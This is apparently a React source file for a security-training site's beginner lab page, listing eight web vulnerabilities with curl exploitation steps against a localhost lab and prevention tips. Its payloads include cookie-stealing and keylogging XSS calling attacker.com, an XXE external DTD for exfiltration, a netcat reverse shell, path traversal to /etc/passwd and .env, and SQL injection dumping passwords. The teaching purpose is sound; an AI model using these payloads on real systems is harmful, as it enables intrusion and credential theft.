import { useState } from 'react';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Button } from '@/components/ui/button';
import { Copy, Terminal, Shield, AlertTriangle } from 'lucide-react';
import MainLayout from '@/components/layout/main-layout';

const walkthroughs = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    difficulty: 'Basic',
    description: 'SQL Injection occurs when untrusted user input is inserted into SQL queries without proper validation or sanitization. This allows attackers to manipulate database queries to extract, modify, or delete data.',
    impact: 'Complete database compromise, data theft, authentication bypass, data corruption',
    steps: [
      {
        step: 1,
        title: 'Identify Input Points',
        description: 'Find user input fields that interact with the database',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1"',
        explanation: 'Test the basic functionality to understand normal behavior'
      },
      {
        step: 2,
        title: 'Test for SQL Injection',
        description: 'Insert SQL metacharacters to trigger errors',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1\'"',
        explanation: 'The single quote should trigger a SQL syntax error if vulnerable'
      },
      {
        step: 3,
        title: 'Determine Column Count',
        description: 'Use UNION SELECT to find the number of columns',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT NULL--"',
        explanation: 'Add NULL values until no error occurs to find column count'
      },
      {
        step: 4,
        title: 'Extract Database Information',
        description: 'Retrieve database version and structure',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT version()--"',
        explanation: 'Get database version to understand the target system'
      },
      {
        step: 5,
        title: 'Enumerate Tables',
        description: 'List all tables in the database',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT table_name FROM information_schema.tables--"',
        explanation: 'Discover all available tables for further exploitation'
      },
      {
        step: 6,
        title: 'Extract Sensitive Data',
        description: 'Retrieve user credentials or sensitive information',
        command: 'curl "http://localhost:5000/api/vuln/sqli?id=1 UNION SELECT username,password FROM users--"',
        explanation: 'Extract actual data from discovered tables'
      }
    ],
    prevention: [
      'Use parameterized queries/prepared statements',
      'Implement input validation and sanitization',
      'Apply principle of least privilege to database accounts',
      'Use stored procedures where appropriate',
      'Enable SQL query logging and monitoring'
    ]
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    difficulty: 'Basic',
    description: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users. These scripts execute in the victim\'s browser with the same privileges as the legitimate website.',
    impact: 'Session hijacking, credential theft, defacement, malware distribution, phishing attacks',
    steps: [
      {
        step: 1,
        title: 'Identify Input Points',
        description: 'Find areas where user input is reflected in the page',
        command: 'curl "http://localhost:5000/api/vuln/xss?search=test"',
        explanation: 'Look for parameters that get displayed back to the user'
      },
      {
        step: 2,
        title: 'Test Basic XSS',
        description: 'Insert simple script tags to test for filtering',
        command: 'curl "http://localhost:5000/api/vuln/xss?search=<script>alert(1)</script>"',
        explanation: 'Basic payload to test if scripts are executed or filtered'
      },
      {
        step: 3,
        title: 'Bypass Filters',
        description: 'Try different encoding and evasion techniques',
        command: 'curl "http://localhost:5000/api/vuln/xss?search=<img src=x onerror=alert(1)>"',
        explanation: 'Use image tag with error event to bypass script tag filters'
      },
      {
        step: 4,
        title: 'Extract Cookies',
        description: 'Steal session cookies using JavaScript',
        command: 'curl "http://localhost:5000/api/vuln/xss?search=<script>document.location=\'http://attacker.com/steal.php?cookie=\'+document.cookie</script>"',
        explanation: 'Redirect user to attacker-controlled server with cookies'
      },
      {
        step: 5,
        title: 'Keylogging Attack',
        description: 'Capture user keystrokes',
        command: 'curl "http://localhost:5000/api/vuln/xss?search=<script>document.onkeypress=function(e){fetch(\'http://attacker.com/log?key=\'+String.fromCharCode(e.which))}</script>"',
        explanation: 'Log every keystroke to attacker server'
      }
    ],
    prevention: [
      'Implement proper output encoding/escaping',
      'Use Content Security Policy (CSP) headers',
      'Validate and sanitize all user inputs',
      'Use HTTPOnly and Secure flags for cookies',
      'Implement input filtering with whitelisting approach'
    ]
  },
  {
    id: 'auth-bypass',
    title: 'Authentication Bypass',
    difficulty: 'Basic',
    description: 'Authentication bypass vulnerabilities allow attackers to gain unauthorized access to restricted areas without providing valid credentials through flaws in authentication logic.',
    impact: 'Unauthorized access, privilege escalation, account takeover, data breaches',
    steps: [
      {
        step: 1,
        title: 'Analyze Login Mechanism',
        description: 'Understand how authentication works',
        command: 'curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=password"',
        explanation: 'Test normal login to understand the authentication flow'
      },
      {
        step: 2,
        title: 'Test SQL Injection in Login',
        description: 'Try SQL injection in authentication fields',
        command: 'curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin\' OR \'1\'=\'1&password=anything"',
        explanation: 'Bypass authentication using SQL injection in username field'
      },
      {
        step: 3,
        title: 'Default Credentials',
        description: 'Test common default username/password combinations',
        command: 'curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=admin&password=admin"',
        explanation: 'Try common default credentials that may not have been changed'
      },
      {
        step: 4,
        title: 'Parameter Manipulation',
        description: 'Manipulate hidden form fields or parameters',
        command: 'curl -X POST "http://localhost:5000/api/vuln/auth" -d "username=user&password=wrong&admin=true"',
        explanation: 'Add additional parameters that might bypass checks'
      },
      {
        step: 5,
        title: 'Session Token Analysis',
        description: 'Analyze session tokens for predictable patterns',
        command: 'curl -i "http://localhost:5000/api/vuln/auth" | grep -i "set-cookie"',
        explanation: 'Examine session cookies for weak randomization'
      }
    ],
    prevention: [
      'Implement strong password policies',
      'Use secure session management',
      'Implement account lockout mechanisms',
      'Use multi-factor authentication',
      'Regular security audits of authentication logic'
    ]
  },
  {
    id: 'sensitive-data',
    title: 'Sensitive Data Exposure',
    difficulty: 'Basic',
    description: 'This vulnerability occurs when applications fail to adequately protect sensitive information like personal data, financial records, or authentication credentials during transmission or storage.',
    impact: 'Identity theft, financial fraud, privacy violations, regulatory compliance failures',
    steps: [
      {
        step: 1,
        title: 'Check HTTP Headers',
        description: 'Examine response headers for sensitive information',
        command: 'curl -I "http://localhost:5000/api/vuln/data-exposure"',
        explanation: 'Look for debug information, server versions, or internal paths'
      },
      {
        step: 2,
        title: 'Directory Traversal',
        description: 'Attempt to access sensitive files',
        command: 'curl "http://localhost:5000/api/vuln/data-exposure?file=../../../etc/passwd"',
        explanation: 'Try to access system files through path traversal'
      },
      {
        step: 3,
        title: 'Configuration Files',
        description: 'Look for exposed configuration files',
        command: 'curl "http://localhost:5000/api/vuln/data-exposure?file=.env"',
        explanation: 'Attempt to access environment files with sensitive data'
      },
      {
        step: 4,
        title: 'Database Files',
        description: 'Try to access database files directly',
        command: 'curl "http://localhost:5000/api/vuln/data-exposure?file=database.sqlite"',
        explanation: 'Look for direct access to database files'
      },
      {
        step: 5,
        title: 'Source Code Access',
        description: 'Attempt to read application source code',
        command: 'curl "http://localhost:5000/api/vuln/data-exposure?file=app.js"',
        explanation: 'Try to access source code that might contain hardcoded secrets'
      }
    ],
    prevention: [
      'Encrypt sensitive data at rest and in transit',
      'Implement proper access controls',
      'Use secure file permissions',
      'Remove debug information from production',
      'Regular security scanning for exposed files'
    ]
  },
  {
    id: 'xxe',
    title: 'XML External Entity (XXE)',
    difficulty: 'Basic',
    description: 'XXE attacks exploit XML parsers that process external entity references, allowing attackers to access local files, internal network resources, or cause denial of service.',
    impact: 'File disclosure, internal network scanning, denial of service, remote code execution',
    steps: [
      {
        step: 1,
        title: 'Identify XML Input',
        description: 'Find endpoints that accept XML data',
        command: 'curl -X POST "http://localhost:5000/api/vuln/xxe" -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><root>test</root>"',
        explanation: 'Test basic XML processing functionality'
      },
      {
        step: 2,
        title: 'Test External Entity',
        description: 'Inject external entity reference',
        command: 'curl -X POST "http://localhost:5000/api/vuln/xxe" -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"',
        explanation: 'Attempt to read local files through external entity'
      },
      {
        step: 3,
        title: 'Parameter Entity Attack',
        description: 'Use parameter entities for more complex attacks',
        command: 'curl -X POST "http://localhost:5000/api/vuln/xxe" -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \\"http://attacker.com/evil.dtd\\"> %xxe;]><root></root>"',
        explanation: 'Load external DTD for out-of-band data exfiltration'
      },
      {
        step: 4,
        title: 'Internal Network Scanning',
        description: 'Scan internal network through XXE',
        command: 'curl -X POST "http://localhost:5000/api/vuln/xxe" -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\"http://192.168.1.1:80\\">]><root>&xxe;</root>"',
        explanation: 'Use XXE to probe internal network services'
      }
    ],
    prevention: [
      'Disable external entity processing in XML parsers',
      'Use less complex data formats like JSON when possible',
      'Implement input validation for XML data',
      'Use XML libraries with secure default configurations',
      'Whitelist allowed DTDs and schemas'
    ]
  },
  {
    id: 'access-control',
    title: 'Broken Access Control',
    difficulty: 'Basic',
    description: 'Access control vulnerabilities occur when users can access resources or perform actions beyond their intended permissions, often through manipulation of URLs, parameters, or missing authorization checks.',
    impact: 'Unauthorized data access, privilege escalation, data modification, administrative access',
    steps: [
      {
        step: 1,
        title: 'Identify Protected Resources',
        description: 'Find resources that should require authorization',
        command: 'curl "http://localhost:5000/api/vuln/access-control?user_id=1"',
        explanation: 'Test normal access to understand the application flow'
      },
      {
        step: 2,
        title: 'Horizontal Privilege Escalation',
        description: 'Access other users\' data by changing parameters',
        command: 'curl "http://localhost:5000/api/vuln/access-control?user_id=2"',
        explanation: 'Change user ID to access another user\'s information'
      },
      {
        step: 3,
        title: 'Vertical Privilege Escalation',
        description: 'Attempt to access administrative functions',
        command: 'curl "http://localhost:5000/api/vuln/access-control?user_id=1&admin=true"',
        explanation: 'Add admin parameter to gain elevated privileges'
      },
      {
        step: 4,
        title: 'Direct Object Reference',
        description: 'Access objects directly by manipulating identifiers',
        command: 'curl "http://localhost:5000/api/vuln/access-control?document_id=123"',
        explanation: 'Try to access documents by guessing or incrementing IDs'
      },
      {
        step: 5,
        title: 'Method Override',
        description: 'Use different HTTP methods to bypass restrictions',
        command: 'curl -X PUT "http://localhost:5000/api/vuln/access-control?user_id=1" -d "role=admin"',
        explanation: 'Try different HTTP methods that might have different access controls'
      }
    ],
    prevention: [
      'Implement proper authorization checks on every request',
      'Use role-based access control (RBAC)',
      'Validate user permissions server-side',
      'Implement the principle of least privilege',
      'Use indirect object references instead of direct ones'
    ]
  },
  {
    id: 'security-misconfig',
    title: 'Security Misconfiguration',
    difficulty: 'Basic',
    description: 'Security misconfigurations occur when applications, servers, or frameworks are deployed with insecure default settings, incomplete configurations, or unnecessary features enabled.',
    impact: 'Information disclosure, unauthorized access, system compromise, data breaches',
    steps: [
      {
        step: 1,
        title: 'Check Debug Information',
        description: 'Look for exposed debug or error information',
        command: 'curl "http://localhost:5000/api/vuln/misconfig?debug=true"',
        explanation: 'Check if debug mode reveals sensitive information'
      },
      {
        step: 2,
        title: 'Directory Listing',
        description: 'Test for directory listing vulnerabilities',
        command: 'curl "http://localhost:5000/api/vuln/misconfig/../"',
        explanation: 'Check if directory listing is enabled'
      },
      {
        step: 3,
        title: 'Default Credentials',
        description: 'Test for default administrative interfaces',
        command: 'curl "http://localhost:5000/admin" -u "admin:admin"',
        explanation: 'Look for admin panels with default credentials'
      },
      {
        step: 4,
        title: 'HTTP Methods',
        description: 'Test for dangerous HTTP methods',
        command: 'curl -X TRACE "http://localhost:5000/api/vuln/misconfig"',
        explanation: 'Check if dangerous HTTP methods like TRACE are enabled'
      },
      {
        step: 5,
        title: 'Server Information',
        description: 'Gather server and application information',
        command: 'curl -I "http://localhost:5000/api/vuln/misconfig"',
        explanation: 'Check headers for server version and technology stack disclosure'
      }
    ],
    prevention: [
      'Remove or disable unnecessary features and services',
      'Change default passwords and configurations',
      'Implement proper error handling without information disclosure',
      'Keep software and dependencies updated',
      'Regular security configuration reviews'
    ]
  },
  {
    id: 'command-injection',
    title: 'Command Injection',
    difficulty: 'Basic',
    description: 'Command injection vulnerabilities allow attackers to execute arbitrary operating system commands on the server by manipulating input that is passed to system commands without proper validation.',
    impact: 'Remote code execution, system compromise, data theft, privilege escalation',
    steps: [
      {
        step: 1,
        title: 'Identify Command Execution Points',
        description: 'Find inputs that might be passed to system commands',
        command: 'curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1"',
        explanation: 'Test normal functionality to understand how commands are executed'
      },
      {
        step: 2,
        title: 'Test Command Chaining',
        description: 'Use command separators to chain commands',
        command: 'curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; whoami"',
        explanation: 'Chain additional commands using semicolon separator'
      },
      {
        step: 3,
        title: 'Command Substitution',
        description: 'Use command substitution to execute commands',
        command: 'curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1 \`whoami\`"',
        explanation: 'Use backticks for command substitution'
      },
      {
        step: 4,
        title: 'File System Access',
        description: 'Access sensitive files on the system',
        command: 'curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; cat /etc/passwd"',
        explanation: 'Read sensitive system files'
      },
      {
        step: 5,
        title: 'Reverse Shell',
        description: 'Establish a reverse shell connection',
        command: 'curl -X POST "http://localhost:5000/api/vuln/command" -d "ping=127.0.0.1; nc -e /bin/sh attacker.com 4444"',
        explanation: 'Create reverse shell for persistent access'
      }
    ],
    prevention: [
      'Avoid calling system commands when possible',
      'Use parameterized APIs instead of shell commands',
      'Implement strict input validation and sanitization',
      'Use whitelist approach for allowed commands',
      'Run applications with minimal privileges'
    ]
  }
];

export default function BeginnerWalkthroughs() {
  const [selectedLab, setSelectedLab] = useState(walkthroughs[0]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <MainLayout>
      <div className="min-h-screen bg-gradient-to-br from-[#0A0A14] via-[#0D0D14] to-[#0A0A14] py-12">
        <div className="max-w-7xl mx-auto px-6">
          <div className="text-center mb-12">
            <h1 className="text-5xl font-bold mb-4">
              <span className="cyber-gradient-text">Beginner Lab Walkthroughs</span>
            </h1>
            <p className="text-xl text-gray-400 mb-6">Complete cheat sheets for mastering web vulnerabilities</p>
            <Badge className="bg-[#00FECA]/20 text-[#00FECA] border-[#00FECA]/30 px-4 py-2 text-lg">
              9 Comprehensive Guides
            </Badge>
          </div>

          <div className="grid lg:grid-cols-4 gap-8">
            {/* Lab Selection Sidebar */}
            <div className="lg:col-span-1">
              <Card className="bg-[#0D0D14] border-gray-800">
                <CardHeader>
                  <CardTitle className="text-[#00FECA] text-lg">Choose Lab</CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  {walkthroughs.map((lab) => (
                    <Button
                      key={lab.id}
                      variant={selectedLab.id === lab.id ? "default" : "ghost"}
                      className={`w-full justify-start text-left h-auto p-3 ${
                        selectedLab.id === lab.id 
                          ? "bg-[#00FECA]/20 text-[#00FECA] border-[#00FECA]/30" 
                          : "text-gray-300 hover:bg-gray-800"
                      }`}
                      onClick={() => setSelectedLab(lab)}
                    >
                      <div>
                        <div className="font-medium">{lab.title}</div>
                        <div className="text-xs text-gray-400">{lab.difficulty}</div>
                      </div>
                    </Button>
                  ))}
                </CardContent>
              </Card>
            </div>

            {/* Main Walkthrough Content */}
            <div className="lg:col-span-3">
              <Card className="bg-[#0D0D14] border-gray-800">
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-2xl cyber-gradient-text">{selectedLab.title}</CardTitle>
                    <Badge className="bg-[#00FECA]/20 text-[#00FECA] border-[#00FECA]/30">
                      {selectedLab.difficulty}
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent>
                  <Tabs defaultValue="overview" className="space-y-6">
                    <TabsList className="grid w-full grid-cols-3 bg-gray-800">
                      <TabsTrigger value="overview" className="text-white">Overview</TabsTrigger>
                      <TabsTrigger value="exploitation" className="text-white">Exploitation</TabsTrigger>
                      <TabsTrigger value="prevention" className="text-white">Prevention</TabsTrigger>
                    </TabsList>

                    <TabsContent value="overview" className="space-y-6">
                      <Alert className="border-[#00FECA]/30 bg-[#00FECA]/10">
                        <Shield className="h-4 w-4 text-[#00FECA]" />
                        <AlertDescription className="text-gray-300">
                          <strong className="text-[#00FECA]">Vulnerability Description:</strong><br />
                          {selectedLab.description}
                        </AlertDescription>
                      </Alert>

                      <Alert className="border-red-500/30 bg-red-500/10">
                        <AlertTriangle className="h-4 w-4 text-red-400" />
                        <AlertDescription className="text-gray-300">
                          <strong className="text-red-400">Potential Impact:</strong><br />
                          {selectedLab.impact}
                        </AlertDescription>
                      </Alert>
                    </TabsContent>

                    <TabsContent value="exploitation" className="space-y-6">
                      <div className="space-y-6">
                        {selectedLab.steps.map((step, index) => (
                          <Card key={index} className="bg-gray-900/50 border-gray-700">
                            <CardHeader className="pb-3">
                              <div className="flex items-center gap-3">
                                <Badge className="bg-[#B14EFF]/20 text-[#B14EFF] border-[#B14EFF]/30">
                                  Step {step.step}
                                </Badge>
                                <CardTitle className="text-lg text-[#00FECA]">{step.title}</CardTitle>
                              </div>
                            </CardHeader>
                            <CardContent className="space-y-4">
                              <p className="text-gray-300">{step.description}</p>
                              
                              <div className="bg-black/50 rounded-lg p-4 border border-gray-700">
                                <div className="flex items-center justify-between mb-2">
                                  <div className="flex items-center gap-2">
                                    <Terminal className="h-4 w-4 text-[#00FECA]" />
                                    <span className="text-sm text-[#00FECA] font-mono">Command</span>
                                  </div>
                                  <Button
                                    size="sm"
                                    variant="ghost"
                                    onClick={() => copyToClipboard(step.command)}
                                    className="h-6 w-6 p-0 text-gray-400 hover:text-[#00FECA]"
                                  >
                                    <Copy className="h-3 w-3" />
                                  </Button>
                                </div>
                                <code className="text-[#00FECA] font-mono text-sm block whitespace-pre-wrap">
                                  {step.command}
                                </code>
                              </div>
                              
                              <div className="bg-blue-950/30 rounded-lg p-3 border border-blue-800/30">
                                <p className="text-blue-200 text-sm">
                                  <strong>Explanation:</strong> {step.explanation}
                                </p>
                              </div>
                            </CardContent>
                          </Card>
                        ))}
                      </div>
                    </TabsContent>

                    <TabsContent value="prevention" className="space-y-6">
                      <Card className="bg-green-950/30 border-green-800/30">
                        <CardHeader>
                          <CardTitle className="text-green-400 flex items-center gap-2">
                            <Shield className="h-5 w-5" />
                            Prevention Measures
                          </CardTitle>
                        </CardHeader>
                        <CardContent>
                          <ul className="space-y-3">
                            {selectedLab.prevention.map((measure, index) => (
                              <li key={index} className="flex items-start gap-3 text-gray-300">
                                <Badge className="bg-green-500/20 text-green-400 border-green-500/30 text-xs mt-0.5">
                                  {index + 1}
                                </Badge>
                                <span>{measure}</span>
                              </li>
                            ))}
                          </ul>
                        </CardContent>
                      </Card>
                    </TabsContent>
                  </Tabs>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </div>
    </MainLayout>
  );
}